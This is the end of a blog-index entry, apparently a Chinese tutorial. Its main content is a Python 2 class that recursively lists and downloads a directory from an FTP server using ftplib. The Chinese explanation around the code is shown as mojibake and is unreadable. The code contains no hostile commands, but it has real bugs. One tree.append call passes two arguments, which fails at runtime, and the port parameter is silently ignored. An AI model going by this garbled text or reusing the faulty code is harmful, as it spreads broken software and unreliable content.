data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvMi43L0xpYi9mdHBsaWIucHk=">Ê∫êÁ†Å<i class="fa fa-external-link-alt"></i></span></li></ul><p>Â§ßÊ¶ÇÂÆûÁé∞ÊÄùË∑ØÂèäÊµÅÁ®ãÂ∑≤Âú®0x01‰∏≠ÊåáÂá∫ÔºåËøôÈáåÂèØËÉΩÈúÄË¶ÅÁî®Âà∞ftplib‰∏≠ÁöÑ‰∏§‰∏™ÂáΩÊï∞</p><ul><li><strong>ftplib.FTP.dir()</strong> : Áî®‰∫éÂàó‰∏æÁõÆÂΩï‰ø°ÊÅØÔºåÂÖ∂ÂÜÖÈÉ®ÂÆûÁé∞Ë∞ÉÁî®ÁöÑÊòØFTPÂçèËÆÆ‰∏≠ÁöÑLISTËØ∑Ê±ÇÔºåËæìÂá∫Ê†ºÂºèÁ±ª‰ººlinux‰∏ãÁöÑÂëΩ‰ª§_<strong>ls -alh</strong>_„ÄÇËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèÔºåÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåËØ•ÂáΩÊï∞ÊòØ‰∏çËøîÂõûÁõÆÂΩï‰ø°ÊÅØÁöÑÂ≠óÁ¨¶‰∏≤ÁöÑÔºåÂÆÉÂú®ÂÜÖÈÉ®ÂÆûÁé∞‰∏≠Ë∞ÉÁî®‰∫Üftplib.FTP.retrlines()ÂáΩÊï∞ÂæóÂà∞ËøîÂõûÊï∞ÊçÆÁöÑÊØè‰∏ÄË°åÔºåÂπ∂ÈªòËÆ§‰ΩøÁî®printlnÂáΩÊï∞Â§ÑÁêÜÊØèË°åÊï∞ÊçÆÔºåÂç≥ÊâìÂç∞Ëá≥Ê†áÂáÜËæìÂá∫„ÄÇÂΩìÁÑ∂ÔºåÂ§ÑÁêÜÊØèË°åÊï∞ÊçÆÁöÑÂáΩÊï∞ÊòØÂèØ‰ª•Ë¢´ÊõøÊç¢ÁöÑÔºåÂú®dir()ÂáΩÊï∞ÁöÑÂèÇÊï∞‰∏≠ÊåáÂá∫Âç≥ÂèØ„ÄÇÂ∞ΩÁÆ°Â¶ÇÊ≠§ËøòÊòØÈöæ‰ª•Â∞ÜÁõÆÂΩï‰ø°ÊÅØÂ≠òÂÖ•Âà∞‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Âπ∂ËøîÂõûÔºå‰ª•‰æõÊàë‰ª¨ÂêéÁª≠Ë∞ÉÁî®„ÄÇÂú®0x02‰∏≠ÊèêÂà∞ÁöÑ3ÊòØÈÄöËøáÊòØÁªôdirÂáΩÊï∞‰º†ÂÖ•Ëá™ÂÆö‰πâÁ±ªÁöÑÂÆû‰æãÂáΩÊï∞ÔºåÂπ∂Â∞ÜÁõÆÂΩï‰ø°ÊÅØÂ≠òÂÇ®Âú®Ëá™ÂÆö‰πâÁ±ªÁöÑÂÆû‰æãÂèòÈáè‰∏≠Êù•ÂæóÂà∞Ëøô‰∏™ÂÄºÁöÑ„ÄÇÂΩìÁÑ∂Ôºå‰πüÂèØ‰ª•ÈÄöËøáËá™ÂÆö‰πâÂáΩÊï∞ÁªìÂêàÂÖ®Â±ÄÂèòÈáèÁöÑÊñπÂºèÊù•ÂæóÂà∞Ëøô‰∏™ÂÄº„ÄÇËøôÁßçÂÆûÁé∞Áï•ÊòæËπ©ËÑöÔºåÂõ†Ê≠§Âú®ËøôÈáåÔºåÊàë‰ª¨ÂèÇÁÖßÂéüÊúâdirÂáΩÊï∞ÁöÑÂÆûÁé∞ÊñπÂºèÔºåÂú®Ëá™ÂÆö‰πâÁ±ª‰∏≠ÂÆûÁé∞‰∏Ä‰∏™Êñ∞ÁöÑdirÂáΩÊï∞ÔºåÂÆÉ‰∏çÁî®ÂÜç‰º†ÂÖ•Â§ÑÁêÜÊØèË°åÊï∞ÊçÆÁöÑÂáΩÊï∞Ôºå‰∏îËÉΩÂ§üËøîÂõûÁõÆÂΩï‰ø°ÊÅØ„ÄÇ</li><li><strong>ftplib.FTP.retrbinary()</strong> : Áî®‰∫éÊåáÂÆöÂπ∂ÂèëÈÄÅÊüêÁßçFTPËØ∑Ê±ÇÔºåÂπ∂‰ª•‰∫åËøõÂà∂Êï∞ÊçÆÊé•Êî∂ÂìçÂ∫î„ÄÇËøôÈáå‰ΩøÁî®ÂÆÉÊù•ÊâßË°åFTPÂçèËÆÆ‰∏≠ÁöÑRETRÂëΩ‰ª§Ôºå‰ª•‰∏ãËΩΩFTPÊúçÂä°Âô®‰∏äÊåáÂÆöË∑ØÂæÑÁöÑÊñá‰ª∂„ÄÇ</li></ul><h3 id="‰ª£Á†Å">‰ª£Á†Å</h3><p>ÂÆûÁé∞‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> ftplib</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FtpDownloader</span><span class="params">(object)</span>:</span></span><br><span class="line">    PATH_TYPE_UNKNOWN = <span class="number">-1</span></span><br><span class="line">    PATH_TYPE_FILE = <span class="number">0</span></span><br><span class="line">    PATH_TYPE_DIR = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, user=None, passwd=None, port=<span class="number">21</span>, timeout=<span class="number">10</span>)</span>:</span></span><br><span class="line">        self.conn = ftplib.FTP(</span><br><span class="line">            host=host,</span><br><span class="line">            user=user,</span><br><span class="line">            passwd=passwd,</span><br><span class="line">            timeout=timeout</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dir</span><span class="params">(self, *args)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        by defualt, ftplib.FTP.dir() does not return any value.</span></span><br><span class="line"><span class="string">        Instead, it prints the dir info to the stdout.</span></span><br><span class="line"><span class="string">        So we re-implement it in FtpDownloader, which is able to return the dir info.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        info = []</span><br><span class="line">        cmd = <span class="string">'LIST'</span></span><br><span class="line">        <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">            <span class="keyword">if</span> arg:</span><br><span class="line">                cmd = cmd + (<span class="string">' '</span> + arg)</span><br><span class="line">        self.conn.retrlines(cmd, <span class="keyword">lambda</span> x: info.append(x.strip().split()))</span><br><span class="line">        <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tree</span><span class="params">(self, rdir=None, init=True)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        recursively get the tree structure of a directory on FTP Server.</span></span><br><span class="line"><span class="string">        args:</span></span><br><span class="line"><span class="string">            rdir - remote direcotry path of the FTP Server.</span></span><br><span class="line"><span class="string">            init - flag showing whether in a recursion.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">if</span> init <span class="keyword">and</span> rdir <span class="keyword">in</span> (<span class="string">'.'</span>, <span class="literal">None</span>):</span><br><span class="line">            rdir = self.conn.pwd()</span><br><span class="line">        tree = []</span><br><span class="line">        tree.append((rdir, self.PATH_TYPE_DIR))</span><br><span class="line"></span><br><span class="line">        dir_info = self.dir(rdir)</span><br><span class="line">        <span class="keyword">for</span> info <span class="keyword">in</span> dir_info:</span><br><span class="line">            attr = info[<span class="number">0</span>]  <span class="comment"># attribute</span></span><br><span class="line">            name = info[<span class="number">-1</span>]</span><br><span class="line">            path = os.path.join(rdir, name)</span><br><span class="line">            <span class="keyword">if</span> attr.startswith(<span class="string">'-'</span>):</span><br><span class="line">                tree.append((path, self.PATH_TYPE_FILE))</span><br><span class="line">            <span class="keyword">elif</span> attr.startswith(<span class="string">'d'</span>):</span><br><span class="line">                <span class="keyword">if</span> (name == <span class="string">'.'</span> <span class="keyword">or</span> name == <span class="string">'..'</span>):  <span class="comment"># skip . and ..</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                tree.extend(self.tree(rdir=path,init=<span class="literal">False</span>))  <span class="comment"># recurse</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tree.append(path, self.PATH_TYPE_UNKNOWN)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> tree</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">downloadFile</span><span class="params">(self, rfile, lfile)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        download a file with path %rfile on a FTP Server and save it to locate</span></span><br><span class="line"><span class="string">        path %lfile.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        ldir = os.path.dirname(lfile)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(ldir):</span><br><span class="line">            os.makedirs(ldir)</span><br><span class="line">        f = open(lfile, <span class="string">'wb'</span>)</span><br><span class="line">        self.conn.retrbinary(<span class="string">'RETR %s'</span> % rfile, f.write)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">treeStat</span><span class="params">(self, tree)</span>:</span></span><br><span class="line">        numDir = <span class="number">0</span></span><br><span class="line">        numFile = <span class="number">0</span></span><br><span class="line">        numUnknown = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> path, pathType <span class="keyword">in</span> tree:</span><br><span class="line">            <span class="keyword">if</span> pathType == self.PATH_TYPE_DIR:</span><br><span class="line">                numDir += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_FILE:</span><br><span class="line">                numFile += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_UNKNOWN:</span><br><span class="line">                numUnknown += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> numDir, numFile, numUnknown</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">downloadDir</span><span class="params">(self, rdir=<span class="string">'.'</span>, ldir=<span class="string">'.'</span>, tree=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                    errHandleFunc=None, verbose=True)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        download a direcotry with path %rdir on a FTP Server and save it to</span></span><br><span class="line"><span class="string">        locate path %ldir.</span></span><br><span class="line"><span class="string">        args:</span></span><br><span class="line"><span class="string">            tree - the tree structure return by function FtpDownloader.tree()</span></span><br><span class="line"><span class="string">            errHandleFunc - error handling function when error happens in</span></span><br><span class="line"><span class="string">                downloading one file, such as a function that writes a log.</span></span><br><span class="line"><span class="string">                By default, the error is print to the stdout.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> tree:</span><br><span class="line">            tree = self.tree(rdir=rdir, init=<span class="literal">True</span>)</span><br><span class="line">        numDir, numFile, numUnknown = self.treeStat(tree)</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Host %s tree statistic:'</span> % self.conn.host</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%d directories, %d files, %d unknown type'</span> % (</span><br><span class="line">                numDir,</span><br><span class="line">                numFile,</span><br><span class="line">                numUnknown</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(ldir):</span><br><span class="line">            os.makedirs(ldir)</span><br><span class="line">        ldir = os.path.abspath(ldir)</span><br><span class="line"></span><br><span class="line">        numDownOk = <span class="number">0</span></span><br><span class="line">        numDownErr = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> rpath, pathType <span class="keyword">in</span> tree:</span><br><span class="line">            lpath = os.path.join(ldir, rpath.strip(<span class="string">'/'</span>).strip(<span class="string">'\\'</span>))</span><br><span class="line">            <span class="keyword">if</span> pathType == self.PATH_TYPE_DIR:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(lpath):</span><br><span class="line">                    os.makedirs(lpath)</span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_FILE:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    self.downloadFile(rpath, lpath)</span><br><span class="line">                    numDownOk += <span class="number">1</span></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                    numDownErr += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> errHandleFunc:</span><br><span class="line">                        errHandleFunc(err, rpath, lpath)</span><br><span class="line">                    <span class="keyword">elif</span> verbose:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">'An Error occurred when downloading '</span>\</span><br><span class="line">                              <span class="string">'remote file %s'</span> % rpath</span><br><span class="line">                        traceback.print_exc()</span><br><span class="line">                        <span class="keyword">print</span></span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'Host %s: %d/%d/%d(ok/err/total) files downloaded'</span> % (</span><br><span class="line">                        self.conn.host,</span><br><span class="line">                        numDownOk,</span><br><span class="line">                        numDownErr,</span><br><span class="line">                        numFile</span><br><span class="line">                    )</span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_UNKNOWN:</span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'Unknown type romote path got: %s'</span> % rpath</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Host %s directory %s download finished:'</span> % (</span><br><span class="line">                self.conn.host, rdir</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%d directories, %d(%d failed) files, %d unknown type.'</span> % (</span><br><span class="line">                numDir,</span><br><span class="line">                numFile,</span><br><span class="line">                numDownErr,</span><br><span class="line">                numUnknown</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">return</span> numDir, numFile, numUnknown, numDownErr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="keyword">import</span> traceback</span><br><span class="line">    <span class="keyword">from</span> pprint <span class="keyword">import</span> pprint <span class="keyword">as</span> pr</span><br><span class="line"></span><br><span class="line">    flog = open(<span class="string">'err.log'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(host)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            fd = FtpDownloader(</span><br><span class="line">                host=host,</span><br><span class="line">                user=<span class="string">'test'</span>,</span><br><span class="line">                passwd=<span class="string">'test'</span>,</span><br><span class="line">                port=<span class="number">21</span>,</span><br><span class="line">                timeout=<span class="number">10</span></span><br><span class="line">            )</span><br><span class="line">            numDir, numFile, numUnknown, numDownErr = fd.downloadDir(</span><br><span class="line">                rdir=<span class="string">'.'</span>,</span><br><span class="line">                ldir=<span class="string">'download'</span>,</span><br><span class="line">                tree=<span class="literal">None</span>,</span><br><span class="line">                errHandleFunc=<span class="literal">None</span>,</span><br><span class="line">                verbose=<span class="literal">True</span></span><br><span class="line">            )</span><br><span class="line">            flog.write(</span><br><span class="line">                <span class="string">'%s\nok\n'</span></span><br><span class="line">                <span class="string">'%d directories, %d(%d failed) files, %d unknown type\n\n\n'</span> % (</span><br><span class="line">                    host,</span><br><span class="line">                    numDir,</span><br><span class="line">                    numFile,</span><br><span class="line">                    numDownErr,</span><br><span class="line">                    numUnknown</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            flog.write(</span><br><span class="line">                <span class="string">'%s\nerror\n%s\n\n\n'</span> % (</span><br><span class="line">                    host,</span><br><span class="line">                    traceback.format_exc()</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    pr(run(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    flog.close()</span><br></pre></td></tr></table></figure><p>‰πüÂèØÁßªÊ≠•Ëá≥<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2Z0cGRvd24=">github<i class="fa fa-external-link-alt"></i></span>Ëé∑Âèñ‰ª£Á†ÅÔºåÊ¨¢ËøéÂÆåÂñÑ„ÄÇ</p><p>ËøôÈáå‰ªÖÊäõÁ†ñÂºïÁéâÔºåÂÆûÁé∞‰∫Ü‰∏ãËΩΩÂçï‰∏™FTPÁöÑÊï¥‰∏™ÁõÆÂΩïÁöÑÊ†∏ÂøÉÂäüËÉΩÔºåÂèØ‰ª•Âü∫‰∫éËØ•‰ª£Á†ÅÁªßÁª≠ÂÆûÁé∞Âπ∂Âèë‰∏ãËΩΩÂ§ö‰∏™FTPÊúçÂä°Âô®‰∏äÁöÑÊåáÂÆöÊñá‰ª∂Â§πÁöÑÂäüËÉΩ„ÄÇ</p><p>ÂÄºÂæó‰∏ÄÊèêÁöÑÊòØÔºåËøôÈáåÈíàÂØπÂçï‰∏™FTPÊúçÂä°Âô®‰∏äÁöÑÂ§ö‰∏™Êñá‰ª∂‰∏ãËΩΩËøòÊòØ‰∏≤Ë°åÁöÑÔºåÂ¶ÇÊÉ≥Ë¶ÅÂÆûÁé∞Âπ∂Âèë‰∏ãËΩΩÂçï‰∏™FTPÊúçÂä°Âô®‰∏äÁöÑÂ§ö‰∏™Êñá‰ª∂ÔºåÂàôÂèØ‰ª•ÂÖàÈÄöËøátreeÂáΩÊï∞ÂæóÂà∞FTPÊúçÂä°Âô®ÁöÑÁõÆÂΩïÊ†ëÔºåÁÑ∂ÂêéÂÜçÂπ∂Âèë‰∏ãËΩΩÁõ∏Â∫îÁöÑÊñá‰ª∂„ÄÇ‰ΩÜÂπ∂Âèë‰∏ãËΩΩÊó∂Ëã•Â§ö‰∏™‰∏ãËΩΩÁ∫øÁ®ãÂÖ±Áî®‰∏Ä‰∏™ftplib.FTPÁ±ªÁöÑÂÆû‰æãÔºåÂπ∂Ë∞ÉÁî®ËØ•ÂÆû‰æãÁöÑretrbinaryÂáΩÊï∞ËøõË°å‰∏ãËΩΩÔºåÂàô‰∏çÂêåÁ∫øÁ®ã‰πãÈó¥ÂèØËÉΩ‰ºöÁõ∏‰∫íÂΩ±ÂìçÔºåÂÖ∑‰ΩìÂèØ‰ª•ÂèÇËÄÉftplibÁöÑÊ∫êÁ†Å„ÄÇ</p><p>ÂΩìÁÑ∂ÔºåË¶ÅËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÔºåÂèØ‰ª•‰∏∫ÊØè‰∏™‰∏ãËΩΩÁ∫øÁ®ãÂàõÂª∫‰∏Ä‰∏™Áã¨ÊúâÁöÑftplib.FTPÁ±ªÁöÑÂÆû‰æãÔºå‰ΩÜËøôÊ†∑Â∞±Âä†Â§ß‰∫ÜFTPÊúçÂä°Âô®Â§ÑÁêÜÁöÑÂπ∂ÂèëËøûÊé•Êï∞ÔºåÊúÄÂ§ßËøûÊé•Êï∞Âèä‰∏ãËΩΩÊÄßËÉΩËøòÊòØ‰ºöÂèóÈôê‰∫éFTPÊúçÂä°Âô®ÔºåÂ≠òÂú®‰∏çÁ°ÆÂÆöÊÄß„ÄÇ</p><p>Êàë‰ª¨Â∞ÜÂÆûÁé∞ÁöÑÁ®ãÂ∫è‰∏éFileziliaËøõË°å‰∫ÜÂØπÊØîÊµãËØïÔºåÂèëÁé∞ÂÆÉÂØπÂ§ö‰∏™Êñá‰ª∂ÁöÑ‰∏ãËΩΩËøáÁ®ã‰πüÊòØ‰∏≤Ë°å‰∫ÜÔºåËÄåÊúÄÁªà‰∏ãËΩΩÊñá‰ª∂ÁöÑÊÄªÊï∞ÂèäÈÄüÂ∫¶‰∫åËÄÖÁõ∏Ëøë„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> FTP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
